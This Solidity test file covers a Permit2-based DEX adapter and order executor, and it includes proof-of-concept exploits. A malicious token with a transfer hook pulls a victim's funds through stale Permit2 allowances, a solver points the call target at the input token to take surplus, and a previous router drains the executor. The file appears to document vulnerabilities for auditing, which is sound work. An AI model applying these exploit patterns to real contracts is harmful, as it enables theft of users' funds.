// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {BaseTest} from "test/base/BaseTest.sol";
import {DynamicP2DexAdapter} from "src/adapter/DynamicP2DexAdapter.sol";
import {IExchangeAdapter} from "src/interface/IExchangeAdapter.sol";
import {Execution, CosignedOrder} from "src/Structs.sol";
import {OrderLib} from "src/lib/OrderLib.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MockDexRouter} from "test/mocks/MockDexRouter.sol";
import {MockPermit2} from "test/mocks/MockPermit2.sol";
import {Executor} from "src/Executor.sol";
import {OrderReactor} from "src/OrderReactor.sol";

contract Permit2Target is MockDexRouter {
    function pull(MockPermit2 permit2, address token, address from, uint160 amount) external {
        permit2.transferFrom(from, address(this), amount, token);
    }

    function swapThroughPreviousTarget(
        Permit2Target previousTarget,
        MockPermit2 permit2,
        address tokenIn,
        uint160 amount,
        uint160 stolenAmount,
        ERC20Mock tokenOut
    ) external {
        previousTarget.pull(permit2, tokenIn, msg.sender, stolenAmount);
        ERC20Mock(tokenIn).transferFrom(msg.sender, address(this), amount);
        tokenOut.mint(msg.sender, amount);
    }

    function doPartialSwap(address tokenIn, uint256 spentAmountIn, address tokenOut, uint256 amountOut, address to)
        external
    {
        ERC20Mock(tokenIn).transferFrom(msg.sender, address(this), spentAmountIn);
        ERC20Mock(tokenOut).mint(to, amountOut);
    }
}

contract MsgSenderPermit2Router {
    function swapWithPermit2(
        MockPermit2 permit2,
        address tokenIn,
        uint160 amountIn,
        ERC20Mock tokenOut,
        uint256 amountOut
    ) external {
        permit2.transferFrom(msg.sender, address(this), amountIn, tokenIn);
        tokenOut.mint(msg.sender, amountOut);
    }
}

contract HookToken is ERC20Mock {
    Permit2Target public immutable previousTarget;
    MsgSenderPermit2Router public immutable msgSenderRouter;
    MockPermit2 public immutable permit2;
    address public immutable tokenToSteal;
    address public immutable victim;
    uint160 public immutable stealAmount;
    uint256 public hookCallCount;
    bool public directPermit2Succeeded;
    bool public msgSenderRouterSucceeded;
    bool public arbitraryFromPullSucceeded;

    constructor(
        Permit2Target _previousTarget,
        MsgSenderPermit2Router _msgSenderRouter,
        MockPermit2 _permit2,
        address _tokenToSteal,
        address _victim,
        uint160 _stealAmount
    ) {
        previousTarget = _previousTarget;
        msgSenderRouter = _msgSenderRouter;
        permit2 = _permit2;
        tokenToSteal = _tokenToSteal;
        victim = _victim;
        stealAmount = _stealAmount;
    }

    function _update(address from, address to, uint256 value) internal override {
        super._update(from, to, value);
        if (from == address(0) && to == victim) {
            hookCallCount++;
            try permit2.transferFrom(victim, address(this), stealAmount, tokenToSteal) {
                directPermit2Succeeded = true;
            } catch {}

            if (address(msgSenderRouter) != address(0)) {
                try msgSenderRouter.swapWithPermit2(permit2, tokenToSteal, stealAmount, this, 0) {
                    msgSenderRouterSucceeded = true;
                } catch {}
            }

            if (address(previousTarget) != address(0)) {
                try previousTarget.pull(permit2, tokenToSteal, victim, stealAmount) {
                    arbitraryFromPullSucceeded = true;
                } catch {}
            }
        }
    }
}

contract DynamicP2DexAdapterTest is BaseTest {
    DynamicP2DexAdapter public adapterUut;
    MockDexRouter public routerA;
    MockDexRouter public routerB;
    MockPermit2 public permit2;

    function setUp() public override {
        super.setUp();
        routerA = new MockDexRouter();
        routerB = new MockDexRouter();
        permit2 = new MockPermit2();
        adapterUut = new DynamicP2DexAdapter(address(permit2));

        ERC20Mock(address(token)).mint(address(adapterUut), 2000 ether);
        adapter = address(adapterUut);
    }

    function test_swap_uses_dynamic_target_for_permit2_and_call() public {
        _swapThrough(address(routerA), 1000 ether);
        assertEq(ERC20Mock(address(token)).balanceOf(address(routerA)), 1000 ether);
        _assertPermit2Approval(address(routerA));

        _swapThrough(address(routerB), 500 ether);
        assertEq(ERC20Mock(address(token)).balanceOf(address(routerB)), 500 ether);
        _assertPermit2Approval(address(routerB));
    }

    function test_swap_reverts_invalid_target() public {
        inAmount = 1000 ether;
        inMax = inAmount;
        outAmount = 500 ether;
        triggerUpper = 0;
        CosignedOrder memory cosignedOrder = order();

        bytes32 hash = OrderLib.hash(cosignedOrder.order);
        uint256 resolvedAmountOut = cosignedOrder.order.output.limit;
        vm.expectRevert(IExchangeAdapter.InvalidTarget.selector);
        Execution memory x = executionWithTargetData(0, address(0), hex"");
        adapterUut.delegateSwap(hash, resolvedAmountOut, cosignedOrder, x);
    }

    function test_previous_target_can_steal_executor_surplus_during_later_swap() public {
        Executor exec = new Executor(address(this), wm);
        Permit2Target previousTarget = new Permit2Target();
        Permit2Target currentTarget = new Permit2Target();
        executor = address(exec);
        inAmount = 1000 ether;
        inMax = inAmount;
        outAmount = inAmount;

        token.mint(executor, inAmount);
        _swapThroughExecutor(
            exec,
            address(previousTarget),
            abi.encodeCall(MockDexRouter.doSwap, (address(token), inAmount, address(token2), inAmount, executor))
        );
        token2.transferFrom(executor, signer, outAmount);

        (,, uint160 remaining, uint48 expiration) = permit2.allowance(executor, address(token), address(previousTarget));
        assertEq(remaining, type(uint160).max);
        assertEq(expiration, type(uint48).max);
        assertEq(token.allowance(executor, address(previousTarget)), 0);
        assertEq(token.allowance(executor, address(permit2)), 0);

        // The executor holds surplus plus the next order's input, but ERC20 cleanup blocks an idle pull.
        uint256 surplus = 500 ether;
        vm.warp(block.timestamp + 1 days);
        token.mint(executor, surplus + inAmount);
        vm.expectRevert(
            abi.encodeWithSignature(
                "ERC20InsufficientAllowance(address,uint256,uint256)", address(permit2), 0, inAmount
            )
        );
        previousTarget.pull(permit2, address(token), executor, uint160(inAmount));

        // A different target calls the old target while the later swap reopens the ERC20 allowance.
        _swapThroughExecutor(
            exec,
            address(currentTarget),
            abi.encodeCall(
                Permit2Target.swapThroughPreviousTarget,
                (previousTarget, permit2, address(token), uint160(inAmount), uint160(surplus), token2)
            )
        );

        assertEq(token.balanceOf(address(previousTarget)), inAmount + surplus);
        assertEq(token.balanceOf(address(currentTarget)), inAmount);
        assertEq(token.balanceOf(executor), 0);
        assertEq(token2.balanceOf(executor), outAmount);
        assertEq(token.allowance(executor, address(currentTarget)), 0);
        assertEq(token.allowance(executor, address(permit2)), 0);
    }

    function test_authorized_solver_can_capture_executor_surplus_via_arbitrary_target_when_permit2_zeroed() public {
        OrderReactor reactorUut = new OrderReactor(repermit, signer, wm);
        Executor exec = new Executor(address(reactorUut), wm);
        Permit2Target previousTarget = new Permit2Target();
        address solver = makeAddr("solver");
        allow(solver);

        reactor = address(reactorUut);
        executor = address(exec);
        adapter = address(adapterUut);
        recipient = other;
        inAmount = 1000 ether;
        inMax = inAmount;
        outAmount = 1000 ether;
        uint256 surplus = 500 ether;
        cosignInValue = 1;
        cosignOutValue = 1;
        slippage = 0;
        freshness = 300;

        // Seed and then explicitly zero Permit2 allowances before running the control and exploit paths.
        vm.startPrank(executor);
        permit2.approve(address(token), address(previousTarget), type(uint160).max, type(uint48).max);
        permit2.approve(address(token), address(routerA), type(uint160).max, type(uint48).max);
        permit2.approve(address(token), solver, type(uint160).max, type(uint48).max);
        permit2.approve(address(token), address(token), type(uint160).max, type(uint48).max);
        vm.stopPrank();
        _zeroPermit2Allowances(address(previousTarget), solver);
        _assertZeroPermit2Allowances(address(previousTarget), solver, true);

        // Control: without transferring surplus, Executor.execute distributes the seeded surplus to the swapper.
        token.mint(executor, surplus);
        token2.mint(solver, outAmount);
        vm.prank(solver);
        token2.transfer(executor, outAmount);

        CosignedOrder memory controlOrder = _signedOrder();
        vm.prank(solver);
        exec.execute(
            controlOrder,
            executionWithTargetData(outAmount, address(token), abi.encodeCall(IERC20.transfer, (solver, inAmount)))
        );

        assertEq(token.balanceOf(solver), inAmount);
        assertEq(token.balanceOf(swapper), surplus);
        assertEq(token2.balanceOf(recipient), outAmount);
        assertEq(token.balanceOf(executor), 0);
        assertEq(token2.balanceOf(executor), 0);

        // Explicitly zero all relevant Permit2 allowances again before the arbitrary-target surplus capture.
        _zeroPermit2Allowances(address(previousTarget), solver);
        _assertZeroPermit2Allowances(address(previousTarget), solver, true);
        _assertZeroErc20Allowances(address(previousTarget), solver);

        // Exploit: solver prefunds required output and sets x.target = input ERC20 with transfer(solver, inAmount + surplus).
        token.mint(executor, surplus);
        token2.mint(solver, outAmount);
        vm.prank(solver);
        token2.transfer(executor, outAmount);

        uint256 solverTokenBefore = token.balanceOf(solver);
        uint256 swapperTokenBefore = token.balanceOf(swapper);
        uint256 recipientOutBefore = token2.balanceOf(recipient);
        CosignedOrder memory co = _signedOrder();

        vm.prank(solver);
        exec.execute(
            co,
            executionWithTargetData(
                outAmount, address(token), abi.encodeCall(IERC20.transfer, (solver, inAmount + surplus))
            )
        );

        assertEq(token.balanceOf(solver) - solverTokenBefore, inAmount + surplus);
        assertEq(token.balanceOf(swapper) - swapperTokenBefore, 0);
        assertEq(token2.balanceOf(recipient) - recipientOutBefore, outAmount);
        assertEq(token.balanceOf(executor), 0);
        assertEq(token2.balanceOf(executor), 0);
        assertEq(token2.balanceOf(solver), 0);

        _assertZeroPermit2Allowances(address(previousTarget), solver, false);
        _assertZeroErc20Allowances(address(previousTarget), solver);
    }

    function test_honest_solver_can_be_forced_to_trigger_stale_permit2_allowance() public {
        OrderReactor reactorUut = new OrderReactor(repermit, signer, wm);
        Executor exec = new Executor(address(reactorUut), wm);
        Permit2Target previousTarget = new Permit2Target();
        address honestSolver = makeAddr("honestSolver");
        allow(honestSolver);

        reactor = address(reactorUut);
        executor = address(exec);
        adapter = address(adapterUut);
        recipient = other;
        inAmount = 1000 ether;
        inMax = inAmount;
        outAmount = 1000 ether;
        uint256 surplus = 500 ether;
        cosignInValue = 1;
        cosignOutValue = 1;
        slippage = 0;
        freshness = 300;

        // 1. Honest solver fills an initial order through previousTarget, leaving an unzeroed Permit2 allowance on Executor.
        CosignedOrder memory firstOrder = _signedOrder();
        vm.prank(honestSolver);
        exec.execute(
            firstOrder,
            executionWithTargetData(
                outAmount,
                address(previousTarget),
                abi.encodeCall(MockDexRouter.doSwap, (address(token), inAmount, address(token2), outAmount, executor))
            )
        );

        (,, uint160 remaining, uint48 expiration) = permit2.allowance(executor, address(token), address(previousTarget));
        assertEq(remaining, type(uint160).max);
        assertEq(expiration, type(uint48).max);
        assertEq(token.allowance(executor, address(permit2)), 0);

        // 2. A later order uses an output token with a transfer hook; the honest solver routes normally through routerB.
        HookToken hookToken = new HookToken(
            previousTarget, MsgSenderPermit2Router(address(0)), permit2, address(token), executor, uint160(surplus)
        );
        outToken = address(hookToken);

        // Control: when previousTarget's stale Permit2 allowance is zeroed, the honest fill distributes surplus to swapper.
        uint256 snap = vm.snapshotState();
        vm.prank(executor);
        permit2.approve(address(token), address(previousTarget), 0, 0);

        token.mint(executor, surplus);
        CosignedOrder memory controlOrder = _signedOrder();
        vm.prank(honestSolver);
        exec.execute(
            controlOrder,
            executionWithTargetData(
                outAmount,
                address(routerB),
                abi.encodeCall(
                    MockDexRouter.doSwap, (address(token), inAmount, address(hookToken), outAmount, executor)
                )
            )
        );

        assertFalse(hookToken.directPermit2Succeeded());
        assertFalse(hookToken.arbitraryFromPullSucceeded());
        assertEq(token.balanceOf(address(previousTarget)), inAmount);
        assertEq(token.balanceOf(address(routerB)), inAmount);
        assertEq(token.balanceOf(honestSolver), 0);
        assertEq(token.balanceOf(swapper), surplus);
        assertEq(hookToken.balanceOf(recipient), outAmount);

        // Exploit: with the stale Permit2 allowance left unzeroed, the exact same honest solver call drains surplus to previousTarget.
        vm.revertToState(snap);
        token.mint(executor, surplus);
        CosignedOrder memory secondOrder = _signedOrder();
        vm.prank(honestSolver);
        exec.execute(
            secondOrder,
            executionWithTargetData(
                outAmount,
                address(routerB),
                abi.encodeCall(
                    MockDexRouter.doSwap, (address(token), inAmount, address(hookToken), outAmount, executor)
                )
            )
        );

        assertFalse(hookToken.directPermit2Succeeded());
        assertTrue(hookToken.arbitraryFromPullSucceeded());
        assertEq(token.balanceOf(address(previousTarget)), inAmount + surplus);
        assertEq(token.balanceOf(address(routerB)), inAmount);
        assertEq(token.balanceOf(honestSolver), 0);
        assertEq(token.balanceOf(swapper), 0);
        assertEq(token.balanceOf(executor), 0);
        assertEq(hookToken.balanceOf(recipient), outAmount);
    }

    function test_stale_permit2_allowance_limits_across_sequential_trades_and_msg_sender_routers() public {
        OrderReactor reactorUut = new OrderReactor(repermit, signer, wm);
        Executor exec = new Executor(address(reactorUut), wm);
        Permit2Target previousTarget = new Permit2Target();
        MsgSenderPermit2Router msgSenderRouter = new MsgSenderPermit2Router();
        Permit2Target partialRouter = new Permit2Target();
        address honestSolver = makeAddr("honestSolver");
        allow(honestSolver);

        reactor = address(reactorUut);
        executor = address(exec);
        adapter = address(adapterUut);
        recipient = other;
        inAmount = 1000 ether;
        inMax = inAmount;
        outAmount = 1000 ether;
        uint256 surplus = 500 ether;
        cosignInValue = 1;
        cosignOutValue = 1;
        slippage = 0;
        freshness = 300;

        // 1. Prior trades with both input and output surplus are swept by Executor.execute after each fill (no accumulation).
        for (uint256 i = 0; i < 2; i++) {
            _executeAs(
                honestSolver,
                address(previousTarget),
                abi.encodeCall(
                    Permit2Target.doPartialSwap,
                    (address(token), inAmount - surplus, address(token2), outAmount + surplus, executor)
                )
            );
            assertEq(token.balanceOf(executor), 0);
            assertEq(token2.balanceOf(executor), 0);
        }
        assertEq(token.balanceOf(swapper), 2 * surplus);
        assertEq(token2.balanceOf(swapper), 2 * surplus);

        // 2. Honest solver also fills through a Permit2 router that binds `from = msg.sender`.
        _executeAs(
            honestSolver,
            address(msgSenderRouter),
            abi.encodeCall(
                MsgSenderPermit2Router.swapWithPermit2, (permit2, address(token), uint160(inAmount), token2, outAmount)
            )
        );
        (,, uint160 msgSenderRemaining,) = permit2.allowance(executor, address(token), address(msgSenderRouter));
        assertEq(msgSenderRemaining, type(uint160).max);

        // 3. Even with seeded surplus, HookToken cannot pull directly from Permit2 or through msgSenderRouter (`from = msg.sender`).
        HookToken safeRouterHookToken = new HookToken(
            Permit2Target(address(0)), msgSenderRouter, permit2, address(token), executor, uint160(surplus)
        );
        outToken = address(safeRouterHookToken);
        token.mint(executor, surplus);
        uint256 swapperBefore = token.balanceOf(swapper);
        _executeAs(
            honestSolver,
            address(routerB),
            abi.encodeCall(
                MockDexRouter.doSwap, (address(token), inAmount, address(safeRouterHookToken), outAmount, executor)
            )
        );
        assertFalse(safeRouterHookToken.directPermit2Succeeded());
        assertFalse(safeRouterHookToken.msgSenderRouterSucceeded());
        assertEq(token.balanceOf(swapper) - swapperBefore, surplus);
        assertEq(token.balanceOf(executor), 0);

        // 4. Without stuck surplus or unspent input on the HookToken swap itself, even arbitrary-`from` previousTarget steals 0.
        HookToken hookToken =
            new HookToken(previousTarget, msgSenderRouter, permit2, address(token), executor, uint160(surplus));
        outToken = address(hookToken);
        uint256 previousTargetBefore = token.balanceOf(address(previousTarget));
        _executeAs(
            honestSolver,
            address(routerB),
            abi.encodeCall(MockDexRouter.doSwap, (address(token), inAmount, address(hookToken), outAmount, executor))
        );
        assertEq(hookToken.hookCallCount(), 1);
        assertFalse(hookToken.directPermit2Succeeded());
        assertFalse(hookToken.msgSenderRouterSucceeded());
        assertFalse(hookToken.arbitraryFromPullSucceeded());
        assertEq(token.balanceOf(address(previousTarget)) - previousTargetBefore, 0);

        // Only when the HookToken swap itself leaves unspent input can arbitrary-`from` previousTarget take that single swap's surplus.
        _executeAs(
            honestSolver,
            address(partialRouter),
            abi.encodeCall(
                Permit2Target.doPartialSwap,
                (address(token), inAmount - surplus, address(hookToken), outAmount, executor)
            )
        );
        assertEq(hookToken.hookCallCount(), 2);
        assertTrue(hookToken.arbitraryFromPullSucceeded());
        assertEq(token.balanceOf(address(previousTarget)) - previousTargetBefore, surplus);

        // 5. Subsequent normal swaps (token -> token2) never invoke HookToken and distribute their own surplus normally.
        outToken = address(token2);
        swapperBefore = token.balanceOf(swapper);
        _executeAs(
            honestSolver,
            address(partialRouter),
            abi.encodeCall(
                Permit2Target.doPartialSwap, (address(token), inAmount - surplus, address(token2), outAmount, executor)
            )
        );
        assertEq(hookToken.hookCallCount(), 2);
        assertEq(token.balanceOf(address(previousTarget)) - previousTargetBefore, surplus);
        assertEq(token.balanceOf(swapper) - swapperBefore, surplus);
        assertEq(token.balanceOf(executor), 0);
    }

    function _executeAs(address caller, address target, bytes memory data) internal {
        CosignedOrder memory co = _signedOrder();
        vm.prank(caller);
        Executor(payable(executor)).execute(co, executionWithTargetData(outAmount, target, data));
    }

    function _signedOrder() internal returns (CosignedOrder memory co) {
        co = order();
        fundOrderInput(co);
        co = cosign(co);
        co.signature = permitFor(co, reactor);
    }

    function _zeroPermit2Allowances(address previousTarget, address solver) internal {
        vm.startPrank(executor);
        permit2.approve(address(token), previousTarget, 0, 0);
        permit2.approve(address(token), address(routerA), 0, 0);
        permit2.approve(address(token), solver, 0, 0);
        permit2.approve(address(token), address(token), 0, 0);
        vm.stopPrank();
    }

    function _assertZeroPermit2Allowances(address previousTarget, address solver, bool includeInputTokenTarget)
        internal
        view
    {
        (,, uint160 prevRemaining, uint48 prevExpiration) = permit2.allowance(executor, address(token), previousTarget);
        assertEq(prevRemaining, 0);
        assertEq(prevExpiration, 0);

        (,, uint160 routerRemaining, uint48 routerExpiration) =
            permit2.allowance(executor, address(token), address(routerA));
        assertEq(routerRemaining, 0);
        assertEq(routerExpiration, 0);

        (,, uint160 solverRemaining, uint48 solverExpiration) = permit2.allowance(executor, address(token), solver);
        assertEq(solverRemaining, 0);
        assertEq(solverExpiration, 0);

        if (includeInputTokenTarget) {
            (,, uint160 tokenRemaining, uint48 tokenExpiration) =
                permit2.allowance(executor, address(token), address(token));
            assertEq(tokenRemaining, 0);
            assertEq(tokenExpiration, 0);
        }
    }

    function _assertZeroErc20Allowances(address previousTarget, address solver) internal view {
        assertEq(token.allowance(executor, address(token)), 0);
        assertEq(token.allowance(executor, address(permit2)), 0);
        assertEq(token.allowance(executor, previousTarget), 0);
        assertEq(token.allowance(executor, address(routerA)), 0);
        assertEq(token.allowance(executor, solver), 0);
        assertEq(token2.allowance(executor, reactor), 0);
    }

    function _swapThroughExecutor(Executor exec, address target, bytes memory data) internal {
        CosignedOrder memory co = order();
        exec.reactorCallback(
            OrderLib.hash(co.order), co.order.output.limit, co, executionWithTargetData(0, target, data)
        );
    }

    function _swapThrough(address target, uint256 amount) internal {
        inAmount = amount;
        inMax = amount;
        outAmount = amount / 2;
        triggerUpper = 0;
        CosignedOrder memory cosignedOrder = order();

        bytes memory data = abi.encodeWithSelector(
            MockDexRouter.doSwap.selector, address(token), amount, address(token2), amount, signer
        );

        bytes32 hash = OrderLib.hash(cosignedOrder.order);
        uint256 resolvedAmountOut = cosignedOrder.order.output.limit;
        Execution memory x = executionWithTargetData(0, target, data);
        adapterUut.delegateSwap(hash, resolvedAmountOut, cosignedOrder, x);

        assertEq(ERC20Mock(address(token)).allowance(address(adapterUut), target), 0);
        assertEq(ERC20Mock(address(token)).allowance(address(adapterUut), address(permit2)), 0);
    }

    function _assertPermit2Approval(address target) internal view {
        (address approvedToken, address approvedSpender, uint160 amount, uint48 expiration) = permit2.lastApproval();
        assertEq(approvedToken, address(token));
        assertEq(approvedSpender, target);
        assertEq(amount, type(uint160).max);
        assertEq(expiration, type(uint48).max);
    }
}
